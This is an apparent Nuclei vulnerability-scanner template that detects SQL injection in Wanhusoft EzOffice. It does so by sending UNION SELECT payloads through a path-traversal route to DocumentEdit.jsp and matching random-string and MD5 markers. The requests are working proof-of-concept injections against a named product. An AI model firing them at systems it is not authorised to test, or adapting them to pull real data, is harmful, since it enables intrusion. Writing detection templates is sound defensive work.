id: wanhusoft-ezoffice-sql-injection
info:
  name: Wanhusoft EzOffice SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects SQL injection vulnerabilities in Wanhusoft EzOffice by injecting payloads and matching unique signatures in the response.
  reference:
    - http://124.223.89.192/archives/ezoffice02
variables:
  r1: "{{rand_int(800000000, 1000000000)}}"
  str1: "{{rand_text_alpha(6)}}"
  str2: "{{rand_text_alpha(6)}}"
http:
  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1%27%20union%20select%20null,null,%27{{str1}}%27||%27{{str2}}%27,null,null,null,null,null,null,null%20from%20dual-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{str1}}{{str2}}"
  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1%27%20union%20select%20(select+md5(%27{{r1}}%27)),null,null,null,null,null,null,null,null,null,null-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "{{md5(r1)}}"
  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1%27%20union%20select%20(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%27{{r1}}%27)),3,32)),null,null,null,null,null,null,null,null,null,null-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "{{md5(r1)}}"
